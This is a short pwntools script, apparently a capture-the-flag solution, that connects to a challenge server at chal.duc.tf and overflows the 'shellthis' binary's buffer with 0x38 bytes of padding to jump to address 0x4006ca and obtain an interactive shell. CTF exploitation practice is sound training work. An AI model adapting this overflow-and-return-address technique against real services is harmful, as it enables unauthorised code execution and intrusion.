
from pwn import *
context.log_level='debug'
payload = 'A'*40
context.arch='amd64'
e = ELF('./shellthis')
#libc = e.libc
#p = process(e.path)
p = remote('chal.duc.tf', 30002)
p.recvline()
p.recv()
payload = 'a'*0x38+p64(0x4006ca)
p.sendline(payload)
p.interactive()